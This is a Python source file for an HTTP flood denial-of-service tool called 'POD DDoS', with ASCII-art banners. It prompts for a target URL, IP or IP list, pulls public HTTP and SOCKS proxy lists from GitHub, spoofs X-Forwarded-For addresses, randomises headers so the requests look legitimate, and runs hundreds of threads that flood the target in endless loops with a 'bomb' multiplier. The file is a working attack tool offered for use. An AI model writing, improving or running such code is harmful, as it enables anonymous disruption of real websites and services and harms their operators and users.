import os

import sys

from socket import socket, AF_INET, SOCK_STREAM
from traceback import print_exc
from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5, PROXY_TYPE_SOCKS4
from threading import Thread
from random import choice, randint
from requests import get
from re import split, match
from concurrent.futures import ThreadPoolExecutor

print("""
            |  |
            |  |
            \  /
             \/


""")
print("""     
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""
           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""

           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""


           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/


""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/

_______________________________
""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
             \/
_______________________________
""")
print("""



           |\**/|      
           \ == /
            |  |
            |  |
            \  /
_____________\/_______________
""")
print("""

         _ ._  _ , _ ._
      (_ ' ( `  )_  .__)
    ( (  (    )   `)  ) _)
   (__ (_   (_ . _) _) ,__)
        `~~`\ ' . /`~~`
             ;   ;
             /   \
____________/_ __ \____________
______________________________
""")
print("""

       _.-^^---....,,--       
   _--                  --_  
  <                        >)
  |                         | 
   \._                   _./  
      ```--. . , ; .--'''       
            | |   |             
         .-=||  | |=-.   
         `-=#$%&%$#=-'   
            | ;  :|     
________.,-#%&$@%#&#~,.________
_______________________________
""")

red = "\033[1;91m"
green = "\033[1;92m"
white = "\033[1;97m"
orange = "\033[1;31m"
end = "\033[1;92m"

design = f"{orange}█████{white}█████{green}█████{end}"

print(f'''
{white}
       _.-^^---....,,--       
   _--                  --_  
  <                        >)
  |                         | 
   \._                   _./  
      ```--. . , ; .--```       
            | |   |             
         .-=||  | |=-.   
         `-=#$%&%$#=-`  
            | ;  :|     
________.,-#%&$@%#&#~,.________
_______________________________
___________ POD DDoS __________





                                                                                                    
                                                                                                    
                                                                                                    
011110101011100101011011010110010101110101101111001101111011111000000101001010101100100011101110100111110001101011000
10010010110010110010000100011001101111000011001110010011100001111000110000000101101010100000001101011001000100110101100010111
00111011110101001101100000000111010101111110010100110000110001000001001110101110001010101010001010010110101001100101001001111
01010110011011011101000110101110001111000111101000101100111011100101110100100010010100101111010010110000010010000101001001000
10111101110111110100110011000001011001111111010011010011011101111100101100001001010011101001001110110011111010001010101001111
01001100111110011111101111011001011001110111110110100100011011000101111101111010011001101100011000101111101101111011000000000
10010110011100100110000110110101111100001000011110110010110110010100000110101011100010111101101101110000011110100101110111111
10011010001101111100000100001101001100001110011111111100011101100101000111000010100000100010011110111101001001110100000111100
10101011010101001111000011000100010101110111101000011111011010000100010010110111011100111010001000011110000000000000110100001
00101101100100101110000011100111001000100101110100110110010001001111010110110110001000110000000100101100111011011101000001000
10100110101101011110010010100000001110000101000011110101010001110110111100100110011011100101011110101110111101011000101001110
00000110110101001000000001000101111011101010010011001000111010101001010100000001010010000000001000011011101101010100010010100
00111111010000001101001011010010100110100001000000000111011110101010100101110100011110100100001101001011010010011100010111000
01111110011100111100000111100101110101001010000110011001000000001000011100011001101011010010101000110110101101011011011001101
01101110110011011010000100001010010110001011011001110011111011001010110000001010010001101110010110101001111000000101000000101
01000000111100011001000110111111001100101001111001110111001100001111101001101100101110101101100000011010100110101000111011111
10101100011110100010000001001110101110001110100001000000101101000100110011101111101101111000110100000110000010100010001101001
00110011010111100110001011000001111111101100100111011011101101001101010111100011010011001101001111001110011110100111111001001
10100001001101001110110111011110100100000100001010000001000101110110010000101001101100100100111100000110110000101100001110111
00000110101000011011000010111111011100110111011100110011110101001000100000100001110011100010101010000110001100011011100110101
11011000011000110101100100111011101101010001100001010100100100100110111001100010010001001010001001101000100100010001000101001
00110001100010100000110110101100010000011011000001001101010110000011000001010011101100010011100011001110101110100011111011000
00000111011010011001000010010111101010000110000100100000111001110000001111100110000111010011010100111101101111010110001001001
10010011001111100001001101101001000100000100011011001000001001011010100110100110101010110110101110101001100000101010010110101
01101100011100100111110111010010000111000111001100001111110101111111101011101011110101101100000100101010100000010110011000010
00001011101101100100011101000111001011100110111101101011101010011001111100011001111010010001011100001000011100001110011000010
01010110000110000110110000011001110100011001101101100101011101100010001011111100100101010001110100101100101011010110111101100
11100010000001110010010110010011111011110001001010000001110001001010101000000011101001011100101110111010111000000100100111010
01010001100111011100010110110111000100000100111010010101001110011001101101100100010010100100111101101111100001111011010000010
11011100000100111010100000001000001100010001010011001100011100010111111000000111001000110101000110011111000010101110000110111
10100101000011101100110100011110100101010010110100010010010001110011100101110110010100101111010101010000110111100101110111010
01010001100010100100001111010101101100101000100010011011100100000111110111101100010100000100100110110011110110101110001111011
01010100111101111101001100000000000110101000100010010101001001001100110100001010011001011111001111001011111011111101100100011
00100001010010110011010110011001010000000110000111000110111101000011100000001010100111101110010100001000111110110001000100010
01010110100110000011001011111010110111100110001111111000001010011001110001101100001101011011000110010010001111110100011001001
11001111100011000001001011110110110111110111011111010111010110011000100001011000101010110000100101100010011101111111101101011
00110001100100101000111010001111010111100010010000000010000011011000011011010110100111000101001101010111000000011111110111011
11000011110100011111100110111101010011001011011011011001100101110111100001100001100111001010111111010101001100100011101110100
01001011100110111101011111100100001111101100110111111110100101100011001110010000001110001110000111101001011100100111010110101
00001011100101000000111000001000010000110101010100001011001010011011101101110101011001100000110111011010000000001010111000101
00000111010101011001010101001000011010101100100111101001000111110011011111011000101001011011100011001101000101111111000110000
01100110101000000001001010000111001000000010101000001011110111001101101101011011000011110111000100011101101101000110000110001
01100110110111101011100011010101110011010111011101110001010100111110000101101101011010101010011101011111110000100000001011100
00011010011011001001101111111010101110100111110111000000000000001011011110010000000111000111111101100000101111111001000010111
01010101001110010110111110011001100100011101011101000110010011110111011011010101110011111100000001100010011101011010010000001
10100101101000010001001100010011011111010100101100101010000101100110110101100011001101010011000011100110001101000010101011000
01100101111110001010111000000010010111011010110001011110010011111001001101001000111010000011110000101101101100110101101100010
01111110001111100011011010010110100001110110100110100011010011110011110011001001010100111101001011001101111010010010110001011
11100010111000000101100100111100111100010101111011011010111110110010100101000001000111011101100011010011001110101101111101110
11010010101100001000001110100001011001010101000011110110010110011110110001000111000101111010111100000010100100110001000110111
00110110000001101110001011101001011010001110101111001100011011100110100101110110011011101000001000101001001101110000111010110




    {design * 10}

	''')  # The graphics are there


useragents = open('headers.txt', 'r+').readlines()

http_proxies = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.split("\n")
socks4_proxy = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text.split("\n")
socks5_proxy = get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text.split("\n")


def Main_Menu(): 
    global url
    global url2
    global urlport
    global chosen
    global ips
    global threads
    global multiple
    global use_proxy
    global anonymity
    global socks_mode
    global proxy_mode

    use_proxy, proxy_mode = False, False

    URL_REGEX = r'http[s]?:\/\/([\w]*[\.])*[a-z0-9]+\.\w+'
    IP_REGEX = r"[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}"

    print("\033[52m")

    try:
        while 1:
            try:
                chosen = int(input(f"\n{green}Do you want one target [0] or more[1] > {end}"))
            except ValueError:
                print(f"{red}Use integers Only!!!{end}")
            if chosen == 1:
                ip_file = input(f"{green}Insert txt file of ips > {end}")
                ips = open(ip_file, "r").readlines()
                break
            elif chosen == 0:
                while 1:             # Automatically detect whether input is IP or URL
                    url = input(f"\n{green}Please Enter URL/IPv4 Address: {end}").strip()
                    if match(URL_REGEX, url):
                        break
                    elif match(IP_REGEX, url):
                        break
                    else:
                        print(f"{red}Pattern Error, please enter correct URL/IPv4 Address{end}")

                url2 = split(r"://", url)[1]

                try:
                    urlport = url.split(":")[2] # directly get port if exist
                except:
                    urlport = "80"

                break # Gets out of Loop
            else:
                print(f"{red}Invalid Options!!!{end}")
    except KeyboardInterrupt:
        print(f"{red}KeyboardInterrupt Detected, Exiting...{end}")
        exit()
    except Exception as e:  # If something goes wrong
        print(f"{red}Error: {e}{end}")

    while 1:
        anonymous = input("\nDo you want to use SOCKS4/5 or proxy [y/n] > ").lower()
        if anonymous == "y":
            use_proxy = True
            try:
                while 1:
                    type = int(input(f"{green}Choose [0] for SOCKS4/5 or [1] proxy > "))
                    if type == 0:
                        socks_mode = True
                        sock_type = int(input(f"{green}Choose [0] for SOCKS4 or [1] for SOCKS5 > "))
                        if sock_type == 0:
                            anonymity = socks4_proxy
                            break
                        elif sock_type == 1:
                            anonymity = socks5_proxy
                            break
                        else:
                            print(f"{red}You mistype, try again.")
                    elif type == 1:
                        proxy_mode = True
                        anonymity = http_proxies
                        break
                    else:
                        print(f"{red}You mistyped, try again.")

            except TypeError:
                print(f"{red}please enter integers only;") 
            break

        elif chosen == "n":
            use_proxy = False
            break

        else:
            print("You mistyped, try again.")

    try:
        threads = int(input("Insert number of threads (800): "))
    except ValueError:
        threads = 800
        print("800 threads selected.\n")

    while 1:
        try:
            multiple = int(input(f"{green}Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: {end}"))
            break
        except ValueError:
            print("You mistyped, try again.\n")

    try:
        input(f"{green}PRESS ANY KEY TO CONTINUE OR CTRL+C TO CANCEL > {end}")
        start_attack()
    except KeyboardInterrupt:
        print("\n\n\033[91mCanceled!\033[0m")

def start_attack():
    try:
        global acceptall
        global connection

        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] # Header Accept at random to make the requests look more legitimate
        # the Keep Alive always is useful to LOL
        connection = "Connection: Keep-Alive\r\n"  #ThanksTherunixx,MyFriend

        ThreadPool = ThreadPoolExecutor(max_workers=threads)
        if use_proxy: # If we have chosen the proxying mode
            if proxy_mode: # And we chose the HTTP Proxy
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestProxyHTTP(i+1).launch) # Start the special class                   
                        # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                # for i in range(threads):
                #     threads_init[i].start() 
            elif socks_mode: # If we have chosen the SOCKS
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestSocksHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                    # This starts threads as soon as they are all ready
            else: # otherwise send normal non -proxate requests.
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestDefaultHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                #This starts threads as soon as they are all ready
    except Exception as e:
        print(print_exc())

class RequestProxyHTTP:  #The Multithreading class

    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable        
        self.counter = counter

    def launch(self):# the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n"  # scelta useragent a caso
        accept = choice(acceptall)  # scelta header accept a caso
        randomip = str(randint(5, 255)) + "." + str(randint(0, 255)) + \
            "." + str(randint(5, 255)) + "." + \
            str(randint(5, 255))
        # X-forward-for, a HTTP Header that allows you to increase anonymity (see Google for info)
        forward = "X-Forwarded-For: " + randomip + "\r\n"
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + forward + connection + "\r\n" # Here is the Final Request
        # wait for threads to be ready
        while 1:  # infinite loop
            proxy = choice(anonymity).strip().split(":")
            try:
                # Here is our socket
                s = socket(AF_INET, SOCK_STREAM)
                # connection to the proxy
                s.connect((str(proxy[0]), int(proxy[1])))
                #Encode In Bytes Della Richiest a HTTP
                s.send(str.encode(request))
                # Print of requests
                print(f"Request sent from {proxy[0]}:{proxy[1]} >> {self.counter}")
                # current+=1
                try:  # Send other requests in the same thread
                    for y in range(multiple):  # multiplication factor
                        # encode In Bytes DellaRichiest a HTTPtaHttp
                        s.send(str.encode(request))
                        # current+=y
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:
                s.close() # If something goes wrong, closes the socket and the cycle starts again

class RequestSocksHTTP:# The Multithreading class
    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        self.counter = counter

    def launch(self):  # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n"  # READY PROXY CHOICE
        accept = choice(acceptall) # CHOICE CHOICE A random
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n" # Final Request Composition      
        # wait for threads to be ready
        while 1:
            proxy = choice(anonymity).strip().split(":")
            try:
                setdefaultproxy(PROXY_TYPE_SOCKS5, str(proxy[0]), int(
                    proxy[1]), True)  # Command to Proxat us with the SOCKS
                s = socksocket() # Socket creation with pysocks
                s.connect((str(url2), int(urlport)))  # connection
                s.send(str.encode(request)) # Send
                #PrintReq +Counter
                print(f"\nRequest sent from {proxy[0]+':'+proxy[1]} >> {self.counter}")
                try:  #Send other requests in the same thread
                    for y in range(multiple): # Multiplication factor
                        # Encode in bytes of the HTTP request
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except: # If something goes wrong, this Except closes the socket and connects to the Try below
                s.close() # Closes Socket
                try: # the Try tries to see if the error is caused by the type of Errata SOCKS, in fact try with SOCKS4
                    setdefaultproxy(PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)# Test with SOCKS4
                    s = socksocket() # Creation New Socket
                    s.connect((str(url2), int(urlport))) # connection
                    s.send(str.encode(request)) # Send
                    # print req + counter
                    print("Request sent from " +
                            str(proxy[0]+":"+proxy[1]) + " @", self.counter)
                    try: # Send other requests in the same thread
                        for y in range(multiple):# Multiplication factor
                            # encode in bytes della richiesta HTTP
                            s.send(str.encode(request))
                    except:  # If something goes wrong, closes the socket and the cycle starts again
                        s.close()
                except:
                    print("Sock down. Retrying request. @", self.counter)
                    # If not even with that Try he managed to send anything, then the SOCK is down and closes the socket.
                    s.close()


class RequestDefaultHTTP: # The Multithreading class

    def __init__(self, counter): # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        Thread.__init__(self)
        self.counter = counter

    def launch(self): # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            choice(useragents) + "\r\n" # Useragent Case
        accept = choice(acceptall)  # accept a case
        if chosen == "1":
            ip = choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n"  #Final Request composition
        #wait for threads to be ready        
        while 1:
            try:
                # socket creation
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((str(url2), int(urlport)))  #connection
                s.send(str.encode(request))  #sending
                print("Request sent! ==>@", self.counter)  # printReq +Counter
                try:  # Send other requests in the same thread
                    for y in range(multiple):  #multiplication factor
                        # encode in bytes della richiesta HTTP
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:  #If something goes wrong
                s.close()  # Closes Socket and starts again


if __name__ == '__main__':
    Main_Menu()